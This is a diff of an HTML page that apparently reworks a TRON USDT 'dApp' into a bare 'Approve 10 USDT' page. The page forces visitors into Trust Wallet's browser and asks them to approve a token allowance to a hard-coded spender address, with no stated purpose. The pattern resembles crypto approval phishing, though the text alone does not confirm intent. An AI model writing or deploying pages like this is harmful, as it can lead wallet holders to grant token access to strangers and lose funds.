@@ -1,149 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>TRON USDT dApp</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <style>
-    body {
-      margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #0b0f14;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    .card {
-      width: 90%;
-      max-width: 380px;
-      background: #111827;
-      border-radius: 20px;
-      padding: 25px;
-      text-align: center;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 14px;
-      border-radius: 12px;
-      border: none;
-      font-size: 16px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-
-    .connect { background: #3b82f6; }
-    .pay { background: #22c55e; }
-    .approve { background: #f59e0b; }
-
-    .address {
-      margin-top: 10px;
-      font-size: 12px;
-      color: #9ca3af;
-      word-break: break-all;
-    }
-
-    .status {
-      margin-top: 10px;
-      font-size: 13px;
-      color: #9ca3af;
-    }
-  </style>
+  <title>Approve USDT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 
-<body>
+<body style="background:#0b0f14;color:white;text-align:center;padding:40px;font-family:sans-serif;">
 
-<div class="card">
+  <h2>Approve 10 USDT</h2>
 
-  <h3>TRON USDT dApp</h3>
+  <p id="status">Opening in Trust Wallet...</p>
 
-  <div id="status" class="status">Checking wallet...</div>
-
-  <button id="connectBtn" class="btn connect" onclick="connectWallet()" style="display:none;">
-    Connect Wallet
+  <button id="approveBtn" onclick="approve()" 
+    style="display:none;padding:15px 25px;background:#f59e0b;border:none;border-radius:10px;color:white;">
+    Approve Now
   </button>
 
-  <div id="address" class="address"></div>
+  <script>
+    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+    const AMOUNT = 10 * 1e6;
 
-  <div id="actions" style="display:none;">
-    <button class="btn pay" onclick="pay()">Send 10 USDT</button>
-    <button class="btn approve" onclick="approve()">Approve 10 USDT</button>
-  </div>
+    let redirected = false;
 
-</div>
+    function waitForWallet() {
+      let tries = 0;
 
-<script>
-const receiver = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
-const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const AMOUNT = 10 * 1e6;
+      const interval = setInterval(() => {
 
-let redirected = false;
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+          clearInterval(interval);
 
-// 🔥 WAIT for tronWeb injection
-function waitForTronWeb() {
-  let tries = 0;
+          document.getElementById("status").innerText =
+            "Wallet detected. Tap approve to continue.";
 
-  const interval = setInterval(() => {
-    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-      clearInterval(interval);
-      onWalletReady();
+          document.getElementById("approveBtn").style.display = "block";
+        }
+
+        tries++;
+
+        // redirect only once if not inside wallet
+        if (tries > 10 && !redirected) {
+          redirected = true;
+
+          const url = encodeURIComponent(window.location.href);
+          window.location.href =
+            `https://link.trustwallet.com/open_url?url=${url}`;
+
+          clearInterval(interval);
+        }
+
+      }, 200);
     }
 
-    tries++;
+    function approve() {
+      document.getElementById("status").innerText =
+        "Waiting for approval...";
 
-    // After ~2 seconds → redirect once
-    if (tries > 10 && !redirected) {
-      redirected = true;
-
-      const url = encodeURIComponent(window.location.href);
-      window.location.href = `https://link.trustwallet.com/open_url?url=${url}`;
-      clearInterval(interval);
+      window.tronWeb.contract().at(CONTRACT).then(contract => {
+        contract.approve(SPENDER, AMOUNT).send({
+          feeLimit: 100000000
+        }).then(tx => {
+          document.getElementById("status").innerText =
+            "Approved successfully ✅";
+        }).catch(() => {
+          document.getElementById("status").innerText =
+            "Approval cancelled ❌";
+        });
+      });
     }
 
-  }, 200);
-}
-
-function onWalletReady() {
-  document.getElementById("status").innerText = "Wallet detected";
-
-  document.getElementById("connectBtn").style.display = "block";
-}
-
-function connectWallet() {
-  const address = window.tronWeb.defaultAddress.base58;
-
-  if (!address) {
-    alert("Unlock your wallet first");
-    return;
-  }
-
-  document.getElementById("address").innerText = "Connected: " + address;
-  document.getElementById("connectBtn").style.display = "none";
-  document.getElementById("actions").style.display = "block";
-}
-
-// ✅ Payment
-function pay() {
-  const url = `https://link.trustwallet.com/send?coin=195&address=${receiver}&amount=10`;
-  window.location.href = url;
-}
-
-// ⚠️ Approval
-function approve() {
-  window.tronWeb.contract().at(CONTRACT).then(contract => {
-    contract.approve(receiver, AMOUNT).send({
-      feeLimit: 100000000
-    });
-  });
-}
-
-// Start detection
-waitForTronWeb();
-</script>
+    waitForWallet();
+  </script>
 
 </body>
 </html>
